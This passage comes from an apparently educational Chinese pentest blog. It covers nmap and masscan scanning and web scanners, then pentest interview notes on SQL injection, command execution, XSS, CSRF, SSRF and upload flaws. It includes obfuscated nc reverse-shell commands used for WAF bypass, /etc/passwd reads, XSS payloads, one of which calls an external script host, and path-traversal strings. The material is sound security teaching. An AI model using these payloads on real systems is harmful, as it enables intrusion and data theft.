不仅是一款端口扫描工具，还可以对主机的服务及版本进行识别和探测。</p><p>本节所使用的命令表：</p><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-sV</td><td>版本探测</td></tr><tr><td>-A</td><td>更加详细直观的扫描</td></tr><tr><td>–version-intensity</td><td>设置扫描强度 1~9 默认为 7</td></tr><tr><td>–version-light</td><td>轻量级扫描 强度为 2</td></tr><tr><td>–version-all</td><td>重量级扫描 强度为 9</td></tr><tr><td>-O</td><td>启用操作系统探测</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># 版本探测</span><br><span class="line">➜  ~ nmap 10.20.24.244 -sV</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:12 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">5900/tcp open  vnc     Apple remote desktop vnc</span><br><span class="line">Service Info: OS: Mac OS X; CPE: cpe:/o:apple:mac_os_x</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds</span><br><span class="line"></span><br><span class="line">  ~ nmap 10.20.24.244 -A</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:13 CST</span><br><span class="line">Nmap scan report for 10.20.24.244</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">5900/tcp open  vnc     Apple remote desktop vnc</span><br><span class="line">|_ssl-cert: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ssl-date: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_tls-alpn: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_vnc-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">Service Info: OS: Mac OS X; CPE: cpe:/o:apple:mac_os_x</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds</span><br><span class="line"></span><br><span class="line"># 操作系统探测</span><br><span class="line">➜  ~ sudo nmap 10.211.55.17 -O</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:25 CST</span><br><span class="line">Nmap scan report for windows-7-1.shared (10.211.55.17)</span><br><span class="line">Host is up (0.00015s latency).</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">49152/tcp open  unknown</span><br><span class="line">49153/tcp open  unknown</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line">49155/tcp open  unknown</span><br><span class="line">49156/tcp open  unknown</span><br><span class="line">49158/tcp open  unknown</span><br><span class="line">MAC Address: 00:1C:42:86:1B:DE (Parallels)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows 7|2008|8.1</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1</span><br><span class="line">OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.54 seconds</span><br></pre></td></tr></table></figure><h3 id="保存输出"><a href="#保存输出" class="headerlink" title="保存输出"></a>保存输出</h3><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-oN</td><td>标准保存</td></tr><tr><td>-oX</td><td>XML 保存</td></tr></tbody></table><p><img src="http://qiniuyun.lintstar.top/20200802104146.png" alt="20200802104146"></p><p><code>快速找到.xml文件中的ip: VSCode ctrl + f 用最右面正则表达式搜索</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;</span><br></pre></td></tr></table></figure><p>Ctrl + Shift + L 选择所有出现在当前选中的行</p><p>VSCode 批量处理ip格式问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">开头标记：^  换成 http://</span><br><span class="line">结尾标记：$  换成 :8080</span><br><span class="line">全选后再替换</span><br></pre></td></tr></table></figure></p><h3 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h3><p>项目地址：<a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener">https://github.com/robertdavidgraham/masscan</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 扫描整个互联网 </span><br><span class="line">masscan 0.0.0.0/0 -p0-65535</span><br><span class="line"></span><br><span class="line"># 输出到文件中</span><br><span class="line">masscan 0.0.0.0/0 -p0-65535 -oX scan.xml</span><br><span class="line"></span><br><span class="line"># 默认的速率100包/秒，如果是扫描全网的话，需要提高速度。</span><br><span class="line">masscan 0.0.0.0/0 -p0-65535 --rate 100000 -oX scan.xml</span><br></pre></td></tr></table></figure><p>实用正则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 正则</span><br><span class="line">((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;</span><br><span class="line"></span><br><span class="line"># 换行</span><br><span class="line">^\s*(?=\r?$)\n</span><br></pre></td></tr></table></figure></p><h1 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h1><h2 id="漏洞扫描工具"><a href="#漏洞扫描工具" class="headerlink" title="漏洞扫描工具"></a>漏洞扫描工具</h2><p>市面上也有很多各种各样的开源、商业扫描器。单就应用这一层来说，漏洞扫描器一般分为主动扫描和被动扫描两种。</p><ul><li><p>主动扫描<br>主动扫描一般用于黑盒测试，其形式为提供一个URL入口地址，然后由扫描器中的爬虫模块爬取所有链接，对GET、POST等请求进行参数变形和污染，进行重放测试，然后依据返回信息中的状态码、数据大小、数据内容关键字等去判断该请求是否含有相应的漏洞。例如：AWVS、Nessus、唐朝扫描器、BugScan、Pocsuite</p></li><li><p>被动扫描<br>被动扫描，与主动扫描相比，被动扫描并不进行大规模的爬虫爬取行为，而是直接通过捕获测试人员的测试请求，直接进行参数变形和污染来测试服务端的漏洞，如果通过响应信息能够判断出漏洞存在，则进行记录管理，有人工再去进行漏洞的复现和确认。例如：BurpSuite、Xray</p></li></ul><p>主动扫描与被动扫描最主要的区别为被动式扫描器不主动获取站点链接，而是通过流量、获取测试人员的访问请求等手段去采集数据源，然后进行类似的安全检测。</p><p><strong>主动扫描的 Web 扫描器的一些不足：</strong></p><p>由于数据源来自爬虫爬取，独立的页面、API接口等就无法覆盖，存在检测遗漏情况。</p><p>果是扫描单独的几个站点，主动扫描是够用的。但是在站点数量急剧增大的时候，主动扫描的效率、精准、速度都无法与被动扫描相比。</p><h2 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h2><p><img src="http://qiniuyun.lintstar.top/20200802112732.png" alt="20200802112732"></p><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。AWVS可以检查SQL注入漏洞，也可以检查跨站脚本攻击漏洞，可以扫描任何可以通过web浏览访问和遵循HTTP/HTTPS规则的 Web 站点和 Web应用程序。</p><p><strong>黑科技：</strong></p><p><img src="http://qiniuyun.lintstar.top/20200802113100.png" alt="20200802113100"></p><p>扫描过程：</p><p><img src="http://qiniuyun.lintstar.top/20200802114217.png" alt="20200802114217"></p><h2 id="Nessus-主机漏洞扫描"><a href="#Nessus-主机漏洞扫描" class="headerlink" title="Nessus 主机漏洞扫描"></a>Nessus 主机漏洞扫描</h2><p><img src="http://qiniuyun.lintstar.top/image-20200727154132756.png" alt="image-20200727154132756"></p><p>Nessus 在全世界有超过 75000 个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus 不同于传统的漏洞扫描软件，支持分布式扫描。</p><p>Linux下 Nessus 常用命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">systemctl status nessusd # 查看运行状态</span><br><span class="line">systemctl start nessusd  # 启动 nessus</span><br><span class="line">systemctl stop nessusd   # 停止 nessus</span><br><span class="line">systemctl restart nessusd# 重启 nessus</span><br><span class="line">systemctl enable nessusd # 开机自启</span><br><span class="line">systemctl disable nessusd# 关闭开机自启</span><br><span class="line">systemctl kill nessusd   # 杀死 nessus 的子进程</span><br></pre></td></tr></table></figure></p><h3 id="基本网络扫描"><a href="#基本网络扫描" class="headerlink" title="基本网络扫描"></a>基本网络扫描</h3><p>多用于进行主机扫描测试，可以扫描系统层面的漏洞：</p><p><img src="http://qiniuyun.lintstar.top/image-20200727155401167.png" alt="image-20200727155401167"></p><h3 id="Web-应用测试"><a href="#Web-应用测试" class="headerlink" title="Web 应用测试"></a>Web 应用测试</h3><p>也可以类型 AWVS 那样对 Web 应用进行测试：</p><p><img src="http://qiniuyun.lintstar.top/image-20200727202443406.png" alt="image-20200727202443406"></p><h2 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h2><p><img src="http://qiniuyun.lintstar.top/1586916483667.png" alt="1586916483667"></p><p><strong>项目地址:<a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">https://github.com/chaitin/xray</a></strong></p><p>长亭科技研发的一款完善的安全评估工具，支持常见Web安全问题扫描和自定义POC，虽然Github有项目，但是不开源，只提供社区版本供大家使用。</p><p>转载：<a href="https://www.sqlsec.com/2020/04/xray.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/04/xray.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;信息收集技术&quot;&gt;&lt;a href=&quot;#信息收集技术&quot; class=&quot;headerlink&quot; title=&quot;信息收集技术&quot;&gt;&lt;/a&gt;信息收集技术&lt;/h1&gt;&lt;p&gt;在渗透测试过程中，第一步就是进行信息收集，信息收集的过程，很多人将其写成了工具、脚本，于是我们就有了很多指纹
      
    
    </summary>
    
      <category term="HackWiki" scheme="https://winthorlimo.github.io/categories/HackWiki/"/>
    
    
      <category term="Hack" scheme="https://winthorlimo.github.io/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>安服面试问题</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined30/6a2e2a4a.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined30/6a2e2a4a.html</id>
    <published>2020-06-30T11:09:05.000Z</published>
    <updated>2020-08-02T05:50:41.729Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试基本流程"><a href="#渗透测试基本流程" class="headerlink" title="渗透测试基本流程"></a>渗透测试基本流程</h2><p>1.信息收集</p><ul><li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li><li>网站指纹识别（包括，cms，cdn，证书等），dns记录</li><li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li><li>子域名收集，旁站查询(有授权可渗透)，C段等</li><li>google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等</li><li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li><li>传输协议，通用漏洞，exp，github源码等</li></ul><p>2.漏洞挖掘</p><p>   XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，使用漏扫工具等</p><p>3.漏洞利用|提权</p><p>   mysql提权，linux系统提权</p><p>4.编写报告|清除测试数据</p><p>5.漏洞复测</p><h2 id="sqlmap的运行机理"><a href="#sqlmap的运行机理" class="headerlink" title="sqlmap的运行机理"></a>sqlmap的运行机理</h2><ol><li><p>尝试连接目标网站</p></li><li><p>确认目标网站是否为动态网页</p></li><li><p>通过报错确认数据库的类型</p></li><li><p>添加payload进行测试</p></li><li><p>测试出注入类型后会对数据库版本进行猜测</p></li><li><p>最后的出结论</p></li></ol><h2 id="htaccess利用"><a href="#htaccess利用" class="headerlink" title=".htaccess利用"></a>.htaccess利用</h2><ul><li><p>htaccess是超文本访问（Hypertext Access）的缩写，是一个基于Apache的Web服务器使用的配置文件，用于控制它所在的目录以及该目录下的所有子目录。</p></li><li><p>.htaccess文件的主要功能包括使用密码保护文件夹，禁止或允许用户使用IP地址访问，禁止目录浏览，将用户自动重定向到另一个页面或目录，创建和使用自定义错误页面，改变具有特定扩展名的文件的使用方式，或者通过指定文件扩展名或特定文件作为主页。</p></li></ul><ol><li>用连续的弹出图片骚扰用户</li><li>可以上传图片马，将jpg文件解析为php文件 </li></ol><h2 id="sql注入原理及防御"><a href="#sql注入原理及防御" class="headerlink" title="sql注入原理及防御"></a>sql注入原理及防御</h2><p>原理 ： 当网站在向后台数据库传递SQL语句进行数据库操作时。如果对用户输入的参数没有经过严格的过滤处理，那么恶意访问者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p><p>防御：</p><ol><li><p>关闭错误提示，php.ini中的display_errors=Off</p></li><li><p>魔术引号当php.ini里的magic_quotes_gpc=On时。提交的变量中所有的单引号（’）、双引号（”）、反斜线（/）与 NUL（NULL 字符）会自动转为含有反斜线的转义字符。</p></li><li><p>通过使用参数化查询和对象关系映射(Object Relational Mappers，ORM)，来避免和修复注入漏洞。此类查询通过指定参数的占位符，以便数据库始终将它们视为数据，而非SQL命令的一部分。</p></li><li><p>使用转义字符</p></li></ol><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>命令执行漏洞原理：<br>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p><p>命令执行漏洞利用条件：</p><ul><li>应用调用执行系统命令的函数</li><li>将用户输入作为系统命令的参数拼接到了命令行中</li><li><p>没有对用户输入进行过滤或过滤不严<br>漏洞分类：</p></li><li><p>代码层过滤不严</p><ul><li>商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：system(“/bin/program –arg $arg”);</li></ul></li><li><p>系统的漏洞造成命令注入</p><ul><li>bash破壳漏洞（CVE-2014-6271）</li></ul></li><li><p>调用的第三方组件存在代码执行漏洞</p><ul><li>如wordPress中用来处理图片的imageMagick组件<br>JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）<br>ThinkPHP命令执行</li></ul></li></ul><p>漏洞危害：</p><ul><li>继承Web服务程序的权限去执行系统命令或读写文件</li><li>反弹shell</li><li>控制整个网站甚至服务器</li><li>进一步内网渗透</li></ul><p>命令拼接符<br>|、||、&amp;、&amp;&amp;的区别：<br>&amp;：无论左边是false还是true，右边都执行<br>&amp;&amp;：具有短路效果，左边是false，右边不执行。<br>|:无论左边是false还是true，右边都会执行<br>||：具有短路效果，左边是true，右边不执行。</p><p>代码执行：</p><ul><li><p>利用系统函数实现命令执行，在php下，允许命令执行的函数有：<br>eval（）、assert（）、preg_replace（）、call_user_func（）<br>如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞</p></li><li><p>其他函数<br>ob_start（）、unserialize（）、creat_function（）<br>、usort（）、uasort（）、uksort（）、<br>array_filter（）、<br>array_reduce（）、<br>array_map（）……</p></li></ul><p>系统命令执行漏洞</p><ul><li>system（）</li><li>exec（）</li><li>shell_exec（）</li><li>passthru（）</li><li>pcntl_exec（）</li><li>popen（）</li><li>proc_open（）</li><li>反引号<br>……</li></ul><p>命令执行WAF绕过技巧</p><ul><li>技巧一：通配符<br>ls-l<br>使用通配符<br>/?in/?s-l</li></ul><p>/???/??t /??c/p???w?<br>有时候WAF不允许使用太多的？号<br>/?in/cat/?tc/p?sswd</p><ul><li>NC反弹shell:<br>nc -e /bin/bash 127.0.0.1 3737<br>为了避免符号，可以将IP地址转换成整型。<br>127.0.0.1-&gt;2130706433</li></ul><p>使用通配符<br>root@kali:~#/??n/?c -e/??n/b??h 2130706433 3737</p><p>技巧二：连接符</p><p>技巧三：未初始化的bash变量<br>在bash环境中允许我们使用未初始化的bash变量，如何<br>$a ,$b,$c<br>我们事先并没有定义它们，输出看看:<br>root@kali:~# echo $a<br>root@kali:~# echo $b<br>root@kali:~# echo $c<br>root@kali:~#<br>未初始化的变量值都是null</p><p>读取/etc/passwd:<br>cat$a /etc$a/passwd$a</p><p>测试WAF<br>测试代码：<br>&lt;?php<br>echo “OK”;<br>system(‘dig’.$_GET[‘host’]);<br>?&gt;</p><p><a href="http://www.baidu.com;$s/bin$s/which$s" target="_blank" rel="noopener">www.baidu.com;$s/bin$s/which$s</a> nc$s<br>反弹shell:<br>/bin$s/nc$s -e/bin$s/bash$s 2130706433 3737</p><p>漏洞修复：</p><ul><li>尽量少用执行命令的函数或者直接禁用</li><li>参数值尽量使用引号包括</li><li>在使用动态函数之前，确保使用的函数是指定的函数之一</li><li>在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义</li><li>对PHP语言来说，不能完全控制的危险函数最好不要使用</li></ul><h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><p>​    恶意攻击者往Web页面里插入恶意javaScript代码，当用户浏览该页之时，嵌入其中Web里面的javaScript代码会被执行，从而达到恶意攻击用户的目的。</p><ul><li><p>反射型XSS：攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p></li><li><p>存储型XSS：代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie。</p></li><li><p>DOM性XSS：DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。</p></li></ul><p>防御：</p><ul><li>进行输入检查，限制输入允许的字符，让特殊字符的攻击失效。XSS Filter</li><li>开启HttpOnly，解决xss后的cookie劫持问题</li><li>进行输出过滤，所有需要输出到页面的元素全部通过HTMLEncode</li></ul><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p><p>防御：</p><ol><li><p>同源检测  禁止不受信任的域名对我们发起请求。</p><p>Origin Header</p><p>Referer Header</p></li><li><p>CSRF Token</p><p>a. 将CSRF Token输出到页面中</p><p>b. 页面提交的请求携带这个Token</p><p>c. 服务器验证Token是否正确</p></li><li><p>双重cookie验证</p><p>在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如<code>csrfcookie=v8g9e4ksfhw</code>）。</p><p>在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例<code>POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw</code>）。</p><p>后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。</p><p>任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间）</p></li><li><p>Samesite Cookie 属性</p></li></ol><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>通常用于控制web进而探测内网服务以及拥挤内网脆弱应用</p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p><p>利用：</p><ul><li><p>file协议查看文件</p></li><li><p>dict协议探测端口</p></li><li><p>gopher协力支持get&amp;post请求</p></li></ul><p>防御：</p><ul><li><p>限制协议为HTTP，HTTPS</p></li><li><p>设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p></li><li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p></li><li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p></li></ul><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。</p><p>造成文件上传漏洞的原因有：</p><ul><li>开源编辑器的上传漏洞</li><li>服务器配置不当</li><li>本地文件上传限制被绕过</li><li>过滤不严或被绕过</li><li>文件解析漏洞导致文件执行</li><li>文件路径截断</li></ul><p>绕过：</p><ul><li><p>%00 截断绕过</p></li><li><p>文件名绕过 大小写绕过  php2 php3 php5 phtml</p></li><li><p>Content-Type绕过</p></li><li><p>前端js绕过</p><ol><li><code>Content-Type绕过</code></li><li><code>前端绕过</code></li><li><code>文件解析规则绕过</code></li><li><code>Windows环境特性绕过</code></li><li><code>文件名大小写绕过</code></li><li><code>双写绕过</code></li><li><code>点空格绕过</code></li><li><code>文件头绕过</code></li><li><code>条件竞争绕过</code></li></ol></li></ul><p>防御</p><ol><li>将文件上传的目录设置为不可执行</li><li>判断文件类型，结合使用MIME Type，后最检查等方式，推荐使用白名单方式</li><li>使用随机数改写文件名和文件路径。</li></ol><h3 id="常用web漏洞测试的payload整理"><a href="#常用web漏洞测试的payload整理" class="headerlink" title="常用web漏洞测试的payload整理"></a><strong>常用web漏洞测试的payload整理</strong></h3><p>[反射型xss]</p><ul><li><p>[在html形成]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&apos;&gt;&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;</span><br><span class="line">&lt;svg οnlοad=document.title=&quot;[random]&quot;;&gt;</span><br></pre></td></tr></table></figure></li><li><p>[在js形成]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">document.title=&quot;[random]&quot;;//</span><br><span class="line">;document.title=&quot;[random]&quot;;//</span><br><span class="line">&quot;;document.title=&quot;[random]&quot;;</span><br><span class="line">&apos;;document.title=&quot;[random]&quot;;</span><br><span class="line">&quot;);document.title=&quot;[random]&quot;;</span><br><span class="line">&apos;);document.title=&quot;[random]&quot;;</span><br></pre></td></tr></table></figure></li><li><p>[在html属性形成(img)]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">888&quot; οnlοad=document.title=&quot;[random]&quot; a=&quot;</span><br><span class="line">888&apos; οnlοad=document.title=&quot;[random]&quot; a=&apos;</span><br><span class="line">888 οnlοad=document.title=&quot;[random]&quot;</span><br></pre></td></tr></table></figure></li></ul><p>[存储型xss]</p><ul><li>[通用payload]<br>测试环境，需要在触发的地方查看payload显示情况<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/StoredXssByScriptTag/);&lt;/script&gt;</span><br><span class="line">&quot;&apos;&gt;&lt;script&gt;alert(/StoredXssByScriptTagBypass);&lt;/script&gt;</span><br><span class="line">[Bypass on Event] [事件型绕过]</span><br><span class="line"></span><br><span class="line">&lt;img src=1 οnerrοr=alert(/StoredXssByImgTag/)&gt;  #一般富文本不会过滤img标签</span><br><span class="line">[Bypass pseudo protocol] [伪协议绕过]</span><br><span class="line"></span><br><span class="line">&lt;iframe src=javascript:prompt(/StoredXssByIframeTag/);&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5wcm9tcHQoL1N0b3JlZFhzc0J5T2JqZWN0VGFnLyk7PC9zY3JpcHQ+&gt;&lt;/object&gt;</span><br><span class="line">[Bypass html5 tag] [html5标签绕过]</span><br><span class="line"></span><br><span class="line">&lt;svg οnlοad=prompt(/StoredXssBySvgTag/)&gt;</span><br><span class="line">&lt;embed src=javascript:alert(/StoredXssByEmbedTag/);&gt;</span><br><span class="line">[Bypass html or js encode] [js编码，html编码，十进制编码绕过等]</span><br><span class="line"></span><br><span class="line">&lt;embed src=javas&amp;#99;r&amp;#105;pt:alert(/StoredXssByEmbedTagAndHtmlEncode/);&gt;</span><br><span class="line">&lt;video&gt;&lt;source οnerrοr=alert(String.fromCharCode(47,83,116,111,114,101,100,88,115,115,98,121,86,105,100,101,111,84,97,103,65,110,100,83,116,114,105,110,103,69,110,99,111,100,101,47))&gt;</span><br><span class="line">&lt;script/src=data:text/j\141v\141script,\u0061%6C%65%72%74(/StoredXssbyScriptTagAndJSEncode/)&gt;&lt;/script&gt;</span><br><span class="line">如果进行盲测可以根据xss平台地址替换相应的js触发代码</span><br><span class="line">&quot;&gt;&lt;script src=http://myxss.net/xxxxxx&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><p>[静态文件读取]</p><ul><li><p>[常规检测]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/../../../../../../../../../../../etc/passwd</span><br><span class="line">/../../../../../../../../../../../etc/hosts     </span><br><span class="line">/../../../../../../../C:/Windows/system.ini [windows]</span><br></pre></td></tr></table></figure><ul><li>[伪造绕过]<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 